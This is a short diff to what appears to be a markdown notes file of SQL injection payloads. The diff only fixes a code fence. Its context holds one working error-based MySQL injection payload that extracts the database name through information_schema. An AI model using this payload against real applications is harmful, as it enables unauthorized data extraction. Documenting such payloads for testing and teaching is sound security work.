@@ -122,4 +122,4 @@ payload
 * to get the data base we can use this payload
 ```mysql
 ' and (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b) and '1'='1
-``
+```
